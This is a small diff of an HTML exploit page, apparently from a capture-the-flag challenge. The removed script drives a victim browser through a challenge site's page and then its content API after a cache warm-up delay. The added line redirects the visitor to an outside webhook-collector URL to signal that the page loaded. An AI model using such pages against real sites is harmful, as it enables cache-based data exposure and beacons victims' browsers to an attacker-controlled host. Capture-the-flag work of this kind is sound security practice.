@@ -1,14 +1,6 @@
 <!doctype html>
-<meta charset=utf-8>
+<meta charset="utf-8">
 <script>
-const chall = 'http://chal.polyuctf.com:43042';
-const id = '4f6032906cafa146f603d2481d1b2d1614478c6243aa65f29163ea65c50f2f8e';
-
-const w = open('about:blank');
-w.location = `${chall}/sites/${id}`;
-
-// 等 /sites/:id 入面嘅 site.js 用 XHR 打完 /api/sites/:id/content，等 cache 熱身
-setTimeout(() => {
-  w.location = `${chall}/api/sites/${id}/content`;
-}, 3000);
+location='https://webhooksite.net/52171b76-aa05-4092-8a80-55bc9eb48fca?s=controller_loaded'
 </script>
+
